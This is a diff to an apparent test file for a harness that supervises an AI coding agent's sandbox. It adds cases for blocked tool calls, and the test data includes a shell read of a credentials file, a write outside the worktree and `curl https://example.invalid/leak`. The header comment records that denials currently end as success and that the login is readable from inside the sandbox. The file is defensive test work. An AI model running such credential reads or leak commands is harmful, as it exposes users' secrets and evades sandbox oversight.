@@ -15,7 +15,9 @@
  * writes in an approved bypass run (ADR-0039, owner decision 25). A sandbox denial (row 7a) or a policy denial (row 8c)
  * then ends `end_turn` at exit 0, and a cancelled call (row 8f) ends `cancelled`, `TOOL_FAILURE`. No hostile stream can
  * end blocked until a capture records the tool-line fields. Every field of the tool lines below other than `type` is
- * hypothetical. Row 11b also showed the native login readable from inside `strict` and `workspace`, so a credential read
+ * hypothetical. Each blocked-category stream pins today's exact result in `gapResult` (a denial at exit 0 ends `ok`; an
+ * exit 1 or a cancelled call ends `TOOL_FAILURE`), checked without a process and through the supervisor replay, so a
+ * parser or guard change in either direction is seen. Row 11b also showed the native login readable from inside `strict` and `workspace`, so a credential read
  * is not expected to be refused by the sandbox at all.
  */
 
@@ -128,6 +130,7 @@ const grokCase: AdapterLegCase = {
       category: "credential_read",
       exitCode: 0,
       failureCode: "SANDBOX_VIOLATION",
+      gapResult: { ok: true },
       lines: [META("shell read of a credential path", 0), ...shellDenied(`cat ${fx.claudeCredentialsPath}`)],
     },
     {
@@ -135,6 +138,7 @@ const grokCase: AdapterLegCase = {
       category: "credential_read",
       exitCode: 0,
       failureCode: "PERMISSION_BLOCKED",
+      gapResult: { ok: false, failureCode: "TOOL_FAILURE" },
       lines: [
         META("shell read of a credential path, cancelled", 0),
         TOOLS,
@@ -152,6 +156,7 @@ const grokCase: AdapterLegCase = {
       category: "credential_read",
       exitCode: 1,
       failureCode: "SANDBOX_VIOLATION",
+      gapResult: { ok: false, failureCode: "TOOL_FAILURE" },
       lines: [
         META("shell read of a credential path, exit 1", 1),
         TOOLS,
@@ -164,14 +169,42 @@ const grokCase: AdapterLegCase = {
       category: "out_of_worktree_write",
       exitCode: 0,
       failureCode: "SANDBOX_VIOLATION",
+      gapResult: { ok: true },
       lines: [META("shell write outside the worktree", 0), ...shellDenied(`touch ${fx.outsideSentinel}`)],
+    },
+    {
+      name: "shell write outside the worktree, exit 1",
+      category: "out_of_worktree_write",
+      exitCode: 1,
+      failureCode: "SANDBOX_VIOLATION",
+      gapResult: { ok: false, failureCode: "TOOL_FAILURE" },
+      lines: [
+        META("shell write outside the worktree, exit 1", 1),
+        TOOLS,
+        toolCall(`touch ${fx.outsideSentinel}`),
+        sandboxDenied(`touch ${fx.outsideSentinel}`),
+      ],
     },
     {
       name: "shell network call",
       category: "network",
       exitCode: 0,
       failureCode: "SANDBOX_VIOLATION",
+      gapResult: { ok: true },
       lines: [META("shell network call", 0), ...shellDenied("curl https://example.invalid/leak")],
+    },
+    {
+      name: "shell network call, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "SANDBOX_VIOLATION",
+      gapResult: { ok: false, failureCode: "TOOL_FAILURE" },
+      lines: [
+        META("shell network call, exit 1", 1),
+        TOOLS,
+        toolCall("curl https://example.invalid/leak"),
+        sandboxDenied("curl https://example.invalid/leak"),
+      ],
     },
     {
       name: "only unknown event kinds, clean exit",
